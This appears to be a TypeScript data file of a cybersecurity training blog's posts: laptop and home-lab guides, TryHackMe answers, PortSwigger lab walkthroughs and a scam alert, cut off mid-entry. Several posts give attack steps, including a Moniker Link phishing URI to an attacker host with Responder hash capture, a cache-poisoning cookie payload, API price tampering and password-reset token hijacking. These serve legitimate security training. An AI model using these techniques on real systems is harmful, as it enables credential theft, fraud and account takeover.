export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  image: string;
  desc: string;
  readTime: string;
  content: {
    intro: string;
    sections: {
      heading: string;
      body: string[];
    }[];
    conclusion: string;
  };
}

export const blogCategories = [
  "All",
  "TryHackMe",
  "PortSwigger",
  "HackTheBox",
  "Guides & Alerts"
];

export const blogs: BlogPost[] = [
  {
    "slug": "best-laptops-for-cybersecurity-training-in-2025",
    "title": "Best Laptops for Cybersecurity Training in 2025",
    "category": "Guides & Alerts",
    "image": "https://cyberiumx.com/wp-content/uploads/2025/07/PortSwigger-1.jpg",
    "desc": "If you’re planning to build a career in cybersecurity, your laptop is one of the most important tools you’ll invest in. Whether you're running Kali Linux, multiple VMs, or packet decoders, here is the ultimate curated hardware guide.",
    "readTime": "7 min read",
    "content": {
      "intro": "Entering cybersecurity requires capable computing hardware. Whether you are running virtualized networks in VirtualBox/VMware, compiling penetration testing exploits, simulating Active Directory domains, or cracking hashes with Hashcat, choosing the right machine makes a significant difference.",
      "sections": [
        {
          "heading": "Key Hardware Specifications to Look For",
          "body": [
            "RAM (Memory): Minimum 16GB is non-negotiable. 32GB is strongly recommended if you plan to run an attacker VM (Kali Linux) alongside target VMs (Windows Server, Ubuntu) simultaneously.",
            "Processor (CPU): Aim for at least an Intel Core i7 (12th Gen+) or AMD Ryzen 7 (5000/6000/7000 series). A higher core count enables dedicated core allocations per virtual machine.",
            "Storage: Fast NVMe SSDs with at least 1TB capacity. VMs and lab snapshots take up massive space quickly.",
            "Dedicated GPU: Optional for beginner ethical hacking, but crucial if you want to explore password hash recovery or local machine learning security analysis."
          ]
        },
        {
          "heading": "Top Laptop Recommendations in 2025",
          "body": [
            "1. Lenovo ThinkPad T14 / P14s: Renowned keyboard durability, exceptional Linux driver compatibility, and upgradable RAM options.",
            "2. Dell XPS 15: Outstanding 14-core Intel processing power, gorgeous display, and powerful multitasking support.",
            "3. Apple MacBook Pro (M2/M3 Pro/Max): Unrivaled battery life and UNIX-based macOS foundation. Note: ARM architecture requires ARM-based Linux VMs (Kali Linux ARM).",
            "4. ASUS ROG Zephyrus G14: Great hybrid machine balancing raw multicore Ryzen power, RTX dedicated GPU for hash cracking, and portable form factor."
          ]
        },
        {
          "heading": "Operating System Strategy",
          "body": [
            "We recommend keeping Windows 11 Pro or macOS as your host OS, and running your penetration testing environments (Kali Linux, Parrot OS, REMnux) inside Type-2 hypervisors like VMware Workstation Pro or VirtualBox for safety and snapshot rollback capabilities."
          ]
        }
      ],
      "conclusion": "Invest in high RAM and CPU cores first before focusing on aesthetics. A reliable machine will serve you well through certifications like CEH, CCNA, and OSCP+."
    }
  },
  {
    "slug": "how-to-build-a-cybersecurity-lab-at-home",
    "title": "How to Build a Cybersecurity Lab at Home",
    "category": "Guides & Alerts",
    "image": "https://cyberiumx.com/wp-content/uploads/2025/07/PortSwigger.jpg",
    "desc": "Practical hands-on experience is essential for any ethical hacker. Learn how to design and build an isolated, cost-effective home lab for network defense and pentesting.",
    "readTime": "8 min read",
    "content": {
      "intro": "Reading theoretical concepts only gets you halfway. Real cybersecurity mastery comes from breaking and defending actual systems. In this guide, we break down how to set up an isolated home hacking lab without putting your personal network at risk.",
      "sections": [
        {
          "heading": "Step 1: Hypervisor Setup & Network Isolation",
          "body": [
            "Install VMware Workstation or Oracle VirtualBox on your primary host.",
            "Create a dedicated Host-Only or Internal NAT Network. This ensures that vulnerable target machines cannot route outbound traffic or infect your home Wi-Fi network."
          ]
        },
        {
          "heading": "Step 2: Deploying Attack and Defense Systems",
          "body": [
            "Attacker Machine: Download the official Kali Linux or Parrot Security Virtual Appliance.",
            "Vulnerable Targets: Download pre-built practice targets like Metasploitable 2/3, OWASP Juice Shop, and DVWA (Damn Vulnerable Web App).",
            "Active Directory Lab: Spin up a Windows Server 2022 trial alongside two Windows 10/11 enterprise clients to practice Kerberoasting, Pass-the-Hash, and domain privilege escalation."
          ]
        },
        {
          "heading": "Step 3: Incorporating a Dedicated SIEM",
          "body": [
            "To understand both sides (Red Team and Blue Team), forward your Windows security event logs and Linux syslogs to a centralized SIEM instance such as Splunk Free or Wazuh. Observe what your attacks look like from a defensive perspective."
          ]
        }
      ],
      "conclusion": "Building a home lab costs zero dollars using free trials and community editions. Spend an hour setting this up, and your practical offensive and defensive skills will skyrocket."
    }
  },
  {
    "slug": "tryhackme-answers-for-cyberchef-the-basics",
    "title": "TryHackMe | Answers for CyberChef: The Basics",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/11/CyberChef-_-The-Basics.jpg",
    "desc": "In this walkthrough, we cover concepts and step-by-step solutions for the 'CyberChef: The Basics' room on TryHackMe, part of the Cyber Security 101 learning path.",
    "readTime": "5 min read",
    "content": {
      "intro": "CyberChef is the Swiss Army knife for cybersecurity analysts, malware reverse engineers, and CTF players. This guide walks through the essential recipes and tasks found in the TryHackMe CyberChef room.",
      "sections": [
        {
          "heading": "Understanding the CyberChef Interface",
          "body": [
            "Input: Where raw data (text, hex, base64 strings, file binaries) is pasted.",
            "Recipe: The sequence of transformations applied in sequential order.",
            "Output: The transformed result displayed in real time.",
            "Auto Bake: Automatically recomputes output whenever input or recipe parameters change."
          ]
        },
        {
          "heading": "Key Recipes & Room Walkthrough",
          "body": [
            "Task: Decoding Base64 strings. Recipe: Add 'From Base64'.",
            "Task: Converting decimal to binary numbers. Recipe: Add 'To Binary' with appropriate delimiter settings.",
            "Task: Unix Timestamp conversion. Recipe: Add 'From UNIX Timestamp' to convert epoch seconds into readable UTC timestamps.",
            "Task: Extracting URLs and IP addresses. Recipe: Use 'Extract IP Addresses' and 'Extract URLs' to automatically parse indicators of compromise (IOCs) from dirty log dumps."
          ]
        }
      ],
      "conclusion": "CyberChef saves hours of manual scripting when analyzing obfuscated strings, malware payloads, and network artifacts."
    }
  },
  {
    "slug": "tryhackme-answers-for-training-impact-on-teams",
    "title": "TryHackMe | Answers for Training Impact on Teams",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/11/TrainingImpactonteams.jpg",
    "desc": "Understand cybersecurity ROI, team ramp-up metrics, and explore solutions for the 'Training Impact on Teams' room.",
    "readTime": "4 min read",
    "content": {
      "intro": "Organizations often struggle with the cybersecurity skills gap. This room demonstrates the measurable impact of hands-on technical training on enterprise security teams.",
      "sections": [
        {
          "heading": "Training ROI & Productivity Metrics",
          "body": [
            "Upskilling vs. Hiring: Ramping up existing employees through continuous labs cuts security onboarding costs by up to 60%.",
            "Mean Time to Detect (MTTD) & Respond (MTTR): Teams that regularly conduct red/blue team simulations resolve real incidents significantly faster.",
            "Custom Learning Paths: Tailoring paths to specific cloud, SOC, and penetration testing roles produces higher engagement and credential retention."
          ]
        }
      ],
      "conclusion": "Structured hands-on practice builds proactive defense capabilities rather than passive compliance."
    }
  },
  {
    "slug": "tryhackme-answers-for-soc-fundamentals",
    "title": "TryHackMe | Answers for SOC Fundamentals",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/11/SOC-Fundamentals.jpg",
    "desc": "A comprehensive guide to SOC operations, SIEM alerts, triage tiers, and solutions for the TryHackMe SOC Fundamentals room.",
    "readTime": "6 min read",
    "content": {
      "intro": "Security Operations Centers (SOCs) are the frontline guardians of enterprise digital infrastructure. This guide covers the operational principles and task solutions for the SOC Fundamentals module.",
      "sections": [
        {
          "heading": "SOC Operational Tiers",
          "body": [
            "Tier 1 (Triage Analyst): Monitors SIEM alerts 24/7, filters false positives, and escalates true security incidents.",
            "Tier 2 (Incident Responder): Conducts deep forensic analysis, scopes the blast radius, and applies containment actions.",
            "Tier 3 (Threat Hunter / Lead): Proactively searches for advanced persistent threats (APTs) residing silently within the network."
          ]
        },
        {
          "heading": "Core Technologies Examined",
          "body": [
            "SIEM (Security Information & Event Management): Aggregates and correlates logs across firewalls, endpoints, and identity providers.",
            "EDR (Endpoint Detection & Response): Provides continuous host monitoring, memory inspection, and isolation controls.",
            "SOAR (Security Orchestration, Automation & Response): Automates playbook execution to neutralize common phishing or brute force attacks."
          ]
        }
      ],
      "conclusion": "Mastering the triage workflow is foundational for landing entry-level SOC Analyst roles."
    }
  },
  {
    "slug": "tryhackme-answers-for-web-application-basics",
    "title": "TryHackMe | Answers for Web Application Basics",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Web-Application-Basics.png",
    "desc": "Master HTTP request-response cycles, headers, cookies, and status codes with this walkthrough of Web Application Basics.",
    "readTime": "5 min read",
    "content": {
      "intro": "Web penetration testing requires deep familiarity with how browsers communicate with web servers. Here is everything you need to understand HTTP mechanics and ace the Web Application Basics room.",
      "sections": [
        {
          "heading": "HTTP Request Structure",
          "body": [
            "Method: GET, POST, PUT, DELETE, OPTIONS, HEAD.",
            "Target URI: The resource endpoint path.",
            "Host Header: Specifies the target domain name (vital for virtual host routing).",
            "User-Agent & Content-Type: Identifies client software and payload MIME formats."
          ]
        },
        {
          "heading": "HTTP Response Status Codes",
          "body": [
            "200 OK: Successful request.",
            "301 / 302: Redirections.",
            "401 Unauthorized / 403 Forbidden: Authentication and authorization failures.",
            "404 Not Found: Resource does not exist.",
            "500 Internal Server Error: Server unhandled exception (prime target for bug hunters)."
          ]
        }
      ],
      "conclusion": "Web application security begins with inspecting every raw HTTP header using tools like Burp Suite or OWASP ZAP."
    }
  },
  {
    "slug": "tryhackme-answers-for-moniker-link-cve-2024-21413",
    "title": "TryHackMe | Answers for Moniker Link (CVE-2024-21413)",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Moniker-Link-CVE-2024-21413.png",
    "desc": "Technical deep-dive into Microsoft Outlook's CVE-2024-21413 Moniker Link flaw allowing remote NTLM hash leakage and RCE risks.",
    "readTime": "7 min read",
    "content": {
      "intro": "CVE-2024-21413 (also known as the Moniker Link bug) is a critical CVSS 9.8 vulnerability affecting Microsoft Outlook that bypassed Protected View security warnings.",
      "sections": [
        {
          "heading": "Vulnerability Mechanics",
          "body": [
            "Outlook uses the MkParseDisplayName API to handle custom URL schemes such as file:// and ms-msdt.",
            "By prepending the exclamation mark '!' to the end of a remote file URI (e.g. file:///\\\\attacker-ip\\share\\file.rtf!something), Outlook fails to trigger security warnings.",
            "When the victim clicks the hyperlink, the host sends an SMB negotiation request containing the victim's NTLMv2 password hash directly to the attacker's server."
          ]
        },
        {
          "heading": "Exploitation & Capture Walkthrough",
          "body": [
            "Run Responder on the attacker machine: responder -I eth0 -v.",
            "Craft the phishing email containing the crafted moniker link hyperlink.",
            "Observe incoming NTLMv2 hash captures on Responder, ready for offline cracking with Hashcat."
          ]
        }
      ],
      "conclusion": "Mitigate this threat by disabling outbound SMB (port 445) at the perimeter firewall and applying official Microsoft security patches."
    }
  },
  {
    "slug": "tryhackme-answers-for-cryptography-basics",
    "title": "TryHackMe | Answers For Cryptography Basics",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Cryptography-Basics.jpg",
    "desc": "Learn encryption primitives, hashing algorithms, digital signatures, and answers for the TryHackMe Cryptography Basics room.",
    "readTime": "6 min read",
    "content": {
      "intro": "Cryptography is the bedrock of modern communications security, protecting confidentiality, integrity, authentication, and non-repudiation.",
      "sections": [
        {
          "heading": "Symmetric vs. Asymmetric Encryption",
          "body": [
            "Symmetric: Uses a single secret key for both encryption and decryption (e.g., AES-256, ChaCha20). Fast and optimal for bulk data transfer.",
            "Asymmetric: Uses a public key for encryption and a private key for decryption (e.g., RSA-4096, ECC). Used for secure key exchange and digital signatures."
          ]
        },
        {
          "heading": "Hashing vs. Encryption",
          "body": [
            "Hashing is a one-way deterministic mathematical function (SHA-256, bcrypt). It cannot be decrypted back into original plaintext.",
            "Encryption is a two-way process designed to be decrypted with the proper secret key."
          ]
        }
      ],
      "conclusion": "Never roll your own crypto—always rely on vetted, industry-standard cryptographic libraries."
    }
  },
  {
    "slug": "tryhackme-answers-for-networking-concepts",
    "title": "TryHackMe | Answers For Networking Concepts",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Networking-Concepts.jpg",
    "desc": "Complete walkthrough of the TCP/IP stack, OSI model, subnetting fundamentals, and solutions for the Networking Concepts room.",
    "readTime": "6 min read",
    "content": {
      "intro": "You cannot defend or penetrate a network without understanding how packets travel across switches, routers, and firewalls. Here is the breakdown for the Networking Concepts module.",
      "sections": [
        {
          "heading": "OSI 7-Layer Model Reference",
          "body": [
            "Layer 7 (Application): HTTP, DNS, SSH, FTP.",
            "Layer 4 (Transport): TCP (reliable, connection-oriented) & UDP (fast, connectionless).",
            "Layer 3 (Network): IP addressing, routing, ICMP.",
            "Layer 2 (Data Link): MAC addressing, Ethernet switches, ARP.",
            "Layer 1 (Physical): Cables, fiber optics, radio frequencies."
          ]
        },
        {
          "heading": "Private vs. Public IP Ranges (RFC 1918)",
          "body": [
            "10.0.0.0 – 10.255.255.255 (Class A)",
            "172.16.0.0 – 172.31.255.255 (Class B)",
            "192.168.0.0 – 192.168.255.255 (Class C)"
          ]
        }
      ],
      "conclusion": "Networking fundamentals are mandatory prerequisites for CCNA, CEH, and OSCP+ certifications."
    }
  },
  {
    "slug": "tryhackme-answers-for-windows-command-line",
    "title": "TryHackMe | Answers For Windows Command Line",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Windows-Command-Line.jpg",
    "desc": "Essential CMD commands for ethical hackers, administrative navigation, and task walkthroughs for the Windows Command Line room.",
    "readTime": "5 min read",
    "content": {
      "intro": "Windows powers over 80% of enterprise endpoints and servers. Knowing how to query system telemetry and manage processes via the Windows Command Prompt is an indispensable skill.",
      "sections": [
        {
          "heading": "Essential Administrative Commands",
          "body": [
            "whoami /all: Displays current user SID, assigned privileges (e.g. SeImpersonatePrivilege), and group memberships.",
            "netstat -ano: Lists all active TCP/UDP connections along with listening ports and corresponding Process IDs (PIDs).",
            "tasklist & taskkill /PID <num> /F: Enumerates running processes and terminates rogue services.",
            "ipconfig /all & arp -a: Gathers IP configuration, DNS servers, and cached MAC-to-IP local mappings."
          ]
        }
      ],
      "conclusion": "Mastering the native command prompt allows you to operate swiftly during initial post-exploitation assessments."
    }
  },
  {
    "slug": "tryhackme-answers-for-search-skills",
    "title": "TryHackMe | Answers For Search Skills",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Search-Skills.jpg",
    "desc": "Master Google dorking, open-source intelligence (OSINT), CVE indexing, and room answers for Search Skills.",
    "readTime": "5 min read",
    "content": {
      "intro": "The best hackers are world-class researchers. Google Dorking and OSINT intelligence gathering let you uncover critical misconfigurations before touching the target system.",
      "sections": [
        {
          "heading": "Advanced Search Operators (Google Dorks)",
          "body": [
            "site:target.com: Restricts search strictly to subdomains and pages of the specified target.",
            "filetype:pdf, filetype:env, filetype:sql: Finds leaked sensitive configuration files or database backups.",
            "inurl:admin or intitle:\"Dashboard\": Discovers hidden login portals and administrative interfaces."
          ]
        },
        {
          "heading": "CVE & Exploit Databases",
          "body": [
            "NVD (National Vulnerability Database): Authoritative source for Common Vulnerabilities and Exposures (CVEs) and CVSS metrics.",
            "Exploit-DB: Curated repository of publicly verified exploit proofs-of-concept."
          ]
        }
      ],
      "conclusion": "Effective search skills dramatically shorten the reconnaissance phase of ethical security assessments."
    }
  },
  {
    "slug": "portswigger-web-cache-poisoning-with-an-unkeyed-header",
    "title": "PortSwigger - Web Cache Poisoning With An Unkeyed Header",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/10/Web-cache-poisoning-with-an-unkeyed-header.png",
    "desc": "In-depth guide and exploit steps for PortSwigger Web Security Academy's Web Cache Poisoning With An Unkeyed Header lab.",
    "readTime": "8 min read",
    "content": {
      "intro": "Web cache poisoning is an advanced exploit technique where an attacker manipulates a caching proxy into serving malicious, poisoned responses to unsuspecting visitors.",
      "sections": [
        {
          "heading": "What is an Unkeyed Header?",
          "body": [
            "Caches determine if two requests are identical using a 'Cache Key' (typically the HTTP Method and Request Path).",
            "Headers not included in the cache key are called 'unkeyed headers' (such as X-Forwarded-Host or X-Host).",
            "If the backend application reflects the value of an unkeyed header into the rendered HTML page without sanitization, the cached copy is poisoned for all subsequent users."
          ]
        },
        {
          "heading": "Step-by-Step Lab Solution",
          "body": [
            "1. Intercept a GET request to the root path '/' using Burp Suite.",
            "2. Add the unkeyed header: X-Forwarded-Host: <your-exploit-server-domain>.",
            "3. On your exploit server, create an exploit file matching the tracking JavaScript resource: /resources/js/tracking.js containing: alert(document.cookie).",
            "4. Send the poisoned request to the target site until you receive an HTTP response with header: 'X-Cache: hit'.",
            "5. When victim users visit the home page, their browser executes your injected JavaScript from the poisoned cache."
          ]
        }
      ],
      "conclusion": "Always validate that caching proxies either include all reflected headers in the cache key or strip untrusted reverse proxy headers completely."
    }
  },
  {
    "slug": "exploiting-a-mass-assignment-vulnerability",
    "title": "PortSwigger- Exploiting a Mass Assignment Vulnerability",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/07/PortSwigger.jpg",
    "desc": "Hello Folks, In this blog post series, we will discover APIs' vulnerabilities. Nowadays, APIs are used in all types of web applications and hence it is important to protect the...",
    "readTime": "7 min read",
    "content": {
      "intro": "Hello Folks, In this blog post series, we will discover APIs' vulnerabilities. Nowadays, APIs are used in all types of web applications and hence it is important to protect the data that can be accessed and modified by exploiting API vulnerabilities. Over here, we will understand Mass Assignment and how to identify and exploit its vulnerabilities. We will be exploring this vulnerability using PortSwigger’s platform. So without any more delays, let’s first understand what API and Mass Assignment are and begin the penetration testing process. If you have followed our series of API penetration testing then you must have a basic understanding of APIs. But let me explain it again. Application Programming Interface (API) is software that allows multiple web applications to share and access the required data between each other. In APIs, there is a technology called as Mass Assignment which automatically maps the user-provided data to a web application’s model using parameters. These parameters can be written in JSON format. If these parameters are not properly sanitized, then it will lead to security vulnerabilities. Now we know about APIs and mass assignment, we can start exploring the vulnerabilities related to it. We will be using a PortSwigger lab to understand the practical aspects of the same.",
      "sections": [
        {
          "heading": "Exploiting a mass assignment vulnerability",
          "body": [
            "Let’s read the lab description and access the lab. We have to find and exploit a mass assignment vulnerability to buy a product without paying any amount. For this lab, we require the Burp Suite Community edition. We have to log in first with the credential pair as wiener user. Now let’s add the “ Lightweight &#8220;l33t&#8221; Leather Jacket ” product to our basket. Now to purchase the product, we have to go to our basket and click on “ Place Order ”. As we have 0 balance in our wallet, we will not be able to purchase it. Now, let’s check all the requests we sent through Burp Suite by clicking on the HTTP History sub-tab under the Proxy tab. Here, we will find two consecutive requests ( GET and POST ) to /api/checkpoint endpoint. We will find almost the same JSON body structure in the GET response and POST request. But there is a difference, the GET response has a “ chosen_discount ” parameter that the POST request doesn’t have.",
            "Let’s send the POST request to Repeater and add the “chosen_discount” parameter as mentioned in the GET request like the following:",
            "&#8220;chosen_discount&#8221;:{ &#8220;percentage&#8221;:0 },"
          ]
        }
      ],
      "conclusion": "If you want to explore our previous blogs on API pen-testing then you can visit them here: Finding and exploiting an unused API endpoint Exploiting an API endpoint using documentation Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "finding-and-exploiting-an-unused-api-endpoint",
    "title": "PortSwigger- Finding And Exploiting An Unused API Endpoint",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/07/PortSwigger-1.jpg",
    "desc": "Hello Folks, All web applications use an Application Programming Interface (API) which is also vulnerable if exploited by an attacker. So as a penetration tester, we should know...",
    "readTime": "9 min read",
    "content": {
      "intro": "Hello Folks, All web applications use an Application Programming Interface (API) which is also vulnerable if exploited by an attacker. So as a penetration tester, we should know how to identify and exploit these API-related vulnerabilities. In this blog, we will understand the complete process which starts from identifying API endpoints, supported HTTP methods, and content types. We will be exploring this vulnerability using PortSwigger’s lab . So without any more delays, let’s first understand what APIs are and begin the penetration testing process. API is software that works as an intermediary and allows a website to access and share data from different systems across multiple organizations. It is important to secure these APIs as they carry data. Now, we know about APIs and their importance, so we have to protect them from intruders. To understand the complete API penetration testing process, we will explore a PortSwigger lab . If you want to learn how to exploit API endpoints using documentation, then you can check out our previous blog .",
      "sections": [
        {
          "heading": "Finding and exploiting an unused API endpoint",
          "body": [
            "Let’s start by reading the lab description where we have to identify and exploit a hidden API endpoint to buy a product without spending any money. For this, we are provided with a credential pair. This lab can be easily solved using the Burp Suite Community edition. After accessing the target website, we have to first log in with the credential pair as wiener user. To identify API endpoints, we have to interact with a web application to explore all the endpoints. We have many products on the home page, but our target is “ Lightweight l33t Leather Jacket ”. So, let’s click on it. We can see that the price of this product is $1337 and we have $0.0 in our balance, so we have to find an API endpoint that might help us here. Let’s switch to Burp Suite and under the HTTP History tab, we will find a GET request to the /api/products/1/price endpoint. So we got our API endpoint and have to test it for which we need to take this request to Repeater. On Repeater, we can make some changes in the request, so let’s try to see which HTTP methods are supported by the server. We can simply confirm the same by replacing the GET with OPTIONS in the API request. After receiving the response for this request, we can see that only GET and PATCH methods are allowed.",
            "Let’s change the GET method to PATCH and send the API request. We will get a response that says that the Content-Type header is missing and it should be application/json . So we have to add a Content-Type request header in the API PATCH request and set application/json as the value of the header. Also, as we added this header, so we have to add an empty JSON object {} in the body of the request. As we send this request, we will receive an error that says the price parameter is missing. Let’s add a Price parameter in the request body and set the value of the price to 0 as follows:",
            "{&#8220;price&#8221;:0}"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "exploiting-an-api-endpoint-using-documentation",
    "title": "PortSwigger- Exploiting An API Endpoint Using Documentation",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/07/PortSwigger-2.jpg",
    "desc": "Hello Folks, This blog will focus on API Testing where we will learn about APIs and their vulnerabilities using PortSwigger platform. All website consists of the API and it is v...",
    "readTime": "10 min read",
    "content": {
      "intro": "Hello Folks, This blog will focus on API Testing where we will learn about APIs and their vulnerabilities using PortSwigger platform. All website consists of the API and it is very important to make them secure. In this blog post, we will explore the vulnerabilities using API documentation. Let’s understand about API in detail and then we will move forward and begin the penetration testing process to secure APIs. API stands for Application Programming Interface which helps a website to communicate with different systems for sharing and accessing data. Using these APIs, the website receives the data from software systems or applications. It is important to secure these APIs but firstly we have to find the API endpoint which is normally available at /api . Let’s understand it with the help of an example. Suppose we are making a GET request to /api/movie endpoint to fetch information related to all the movies. There can be other API endpoints available like /api/movie/horror , /api/movie/action , etc. to retrieve information related to horror and action movies respectively. After identifying the endpoints, we can now send requests to them using various HTTP methods like GET , POST , PUT , DELETE , etc. Some API processes the input data provided by the user using different parameters. So, it is important to have information related to HTTP methods and their input parameters. Now, the next important way to learn about the APIs is to look for documentation. These documents help the developer to work with the API. To discover these documents on the website using API, we can use the Burp Scanner or directory bursting techniques. If we have identified an endpoint like /api/movie/horror , it is always recommended to check all the paths like /api/movie , /api , etc. Also, we can use the Burp Intruder to brute-force the web pages using a wordlist of various API endpoints. After getting a basic understanding of APIs let’s now try to find these API endpoints and exploit them using their documentation. We will be using PortSwigger’s lab to see the same in action.",
      "sections": [
        {
          "heading": "Exploiting an API endpoint using documentation",
          "body": [
            "Let’s read the lab description where we are provided with our credentials. We must identify the exposed API documentation and delete a user from the application. We will require the Burp Suite Community edition to solve the lab. After accessing the target web application, we are required to log in as wiener user using our credentials on the /login page. Once we are logged in as wiener, we will find an email change functionality on our profile. Let’s change our email address to an arbitrary email. On Burp Suite, under HTTP history we will find a PATCH request towards /api/user/wiener which we need to select and send to Repeater. On Repeater, remove the username ( wiener ) from the endpoint and send the request. We will find an error as the username is not mentioned. Let’s now send a GET request to the /api endpoint and we will notice a response with the API documentation. We can click on the Render tab under the Response section to check the response. We will find other APIs which can perform various tasks.",
            "To solve the lab, we have to delete a user from the application. We can see a DELETE HTTP method is available for the /api/user/&lt;username&gt; endpoint which might delete our target user. This functionality is interactive if we open the same on our browser by right-clicking on the request and selecting “ Show response in browser ”. Copy and paste the URL on the browser to access the same functionality. We can simply click on the DELETE row and enter the username as carlos to delete the user. Also, we can use Burp Suite to do the same. We have to make some changes to the available request at Repeater. We have to change the HTTP method to DELETE and send the request to /api/user/carlos . As we click on the “ Send ” button to send the request to the web server, we will find that the user is successfully deleted from the application.",
            "So this is how we can identify the API documentation and use it to exploit API-related vulnerabilities. Hence the lab is solved."
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "e-challan-scam-alert",
    "title": "E-Challan Scam Alert!",
    "category": "Guides & Alerts",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/07/E-challan-Scam-Alert.jpg",
    "desc": "In today's digital age, numerous fraudulent schemes have developed. Traffic violations, similar to various aspects of online services, have turned into a means for scammers. Uns...",
    "readTime": "10 min read",
    "content": {
      "intro": "In today's digital age, numerous fraudulent schemes have developed. Traffic violations, similar to various aspects of online services, have turned into a means for scammers. Unscrupulous individuals trick non-guilty users into falling for a contemporary type of trickery called phishing. They are informed about alleged traffic violations through alerts and, once they click a link or download an application, the scammers use this opportunity to rob their bank accounts and disappear without a trace. The Ministry of Electronics & Information Technology (MeitY) issued a caution through its Information Security Awareness (ISEA) initiative regarding the rise in fraud cases linked to the e-challan scam. Increasing public awareness is essential for tackling this danger.",
      "sections": [
        {
          "heading": "What is an E-Challan Scam?",
          "body": [
            "The E-challan scam involves a digital assault aimed at individuals who think they have gotten or suspect they have gotten a ticket for a traffic violation that has been sent electronically. Scammers use different strategies to trick individuals into revealing personal information or giving away money. An online e-challan scam recently duped a 43-year-old man from Thane Bhosale, a driver of an auto-rickshaw, got a text stating he had committed a traffic offence and directed him to make the payment using the Vahan Parivahan app. Once the app was installed, Bhosale started getting multiple OTPs on his phone. He swiftly removed the app from his device. Even though he acted quickly, his account had already been subject to unauthorized transactions totaling Rs 50,000. Here, cybercriminals operate a fake traffic police electronic challenge system, targeting people who either ignore or quickly scan through the e-challan. To tackle this problem, the government started a cyber security awareness initiative a few months back to inform the public about online scams. Here is all the information you should have regarding this recently surfaced e-challan scam.",
            "The method used in this scam involves tricking people into clicking on a harmful link to settle their traffic challan. To make the scam appear legitimate, the fake message is carefully crafted to seem authentic. The deceptive message will read something like this - &#8220;Your Challan No. is … for vehicle number… having challan amount as Rs 500. For online payment of e-challan visit https://echallanparivahan.in/ you can also contact RTO office for disposal of challan, Regards, RTO.&#8221;",
            "If you click on this payment link to settle the e-challan, you will end up paying cyber criminals instead of the police in an attempt to clear the traffic e-challan."
          ]
        },
        {
          "heading": "How does this Scam work?",
          "body": [
            "The method used in this scam involves tricking people into clicking on a harmful link to settle their traffic challan. To make the scam appear legitimate, the fake message is carefully crafted to seem authentic. The deceptive message will read something like this - &#8220;Your Challan No. is … for vehicle number… having challan amount as Rs 500. For online payment of e-challan visit https://echallanparivahan.in/ you can also contact RTO office for disposal of challan, Regards, RTO.&#8221;",
            "If you click on this payment link to settle the e-challan, you will end up paying cyber criminals instead of the police in an attempt to clear the traffic e-challan.",
            "The scammers have copied the design from traffic authorities accurately, making the message appear real at first glance. However, with close examination, the scam can be identified."
          ]
        },
        {
          "heading": "How to avoid traffic E-Challan Scam?",
          "body": [
            "If you click on this payment link to settle the e-challan, you will end up paying cyber criminals instead of the police in an attempt to clear the traffic e-challan.",
            "The scammers have copied the design from traffic authorities accurately, making the message appear real at first glance. However, with close examination, the scam can be identified.",
            "When verifying an e-challan message, assess three factors to distinguish between its authenticity and deceitfulness."
          ]
        }
      ],
      "conclusion": "Follow us for more Cyber updates."
    }
  },
  {
    "slug": "portswigger-password-reset-poisoning-via-middleware",
    "title": "PortSwigger- Password Reset Poisoning Via Middleware",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/06/Password-reset-poisoning-via-middleware.png",
    "desc": "Hello Folks, This blog focuses on the identification and exploitation of HTTP Host header vulnerability . We will understand this vulnerability and then see how we can perform p...",
    "readTime": "7 min read",
    "content": {
      "intro": "Hello Folks, This blog focuses on the identification and exploitation of HTTP Host header vulnerability . We will understand this vulnerability and then see how we can perform password reset poisoning via middleware . We will be utilizing the PortSwigger platform to understand this vulnerability. So, let’s begin and understand this vulnerability before exploiting it. The host header is an essential HTTP request header that allows our request to reach the desired domain name. The HTTP Host header vulnerability arises when the server doesn’t validate the value of the Host header and processes it. An attacker can easily identify this vulnerability and can perform server-side attacks like password reset poisoning, web cache poisoning, SQL injection, routing-based SSRF, etc.",
      "sections": [
        {
          "heading": "Lab- Password reset poisoning via Middleware",
          "body": [
            "Let’s open this lab on PortSwigger and read the lab description. This lab requires Burp Suite community edition . We have to target the password reset functionality which we can find after clicking on the “ My account ” button. We are asked to provide the username or email address of the user. For now, we will provide Wiener as our username. We will receive a password reset link on our email client which is available on the exploit server. We can click on the link and provide a new password for the wiener user. Now after exploring the password reset functionality, we will try to identify the vulnerability using Burp Suite. Let’s find a POST request to /forgot-password endpoint and send the request to Repeater. Let’s try to change the value of the original Host header with an arbitrary value and we will find that it is not accepted. So we have to try another way to identify this vulnerability. We can add another header “ X-Forwarded-Host ” which if supported by the application can override the original Host header. Let’s provide our arbitrary domain name ( cyberiumx.com ) and send the request. On our email client, we will find another password reset link that contains our domain name.",
            "It confirms that this functionality is vulnerable with HTTP Host header vulnerability. Now we have to replace the value of the new header with our exploit server URL. Also, we have to change the username to carlos to target the user. Let’s send the request.",
            "Once the password reset link is clicked by the victim user, we will receive the token value on our exploit server logs which we can access from the exploit server by clicking on the “ Access log ” button. Now we need to copy the token value and use it to reset the password of carlos user using the following URL:"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "portswigger-basic-password-reset-poisoning",
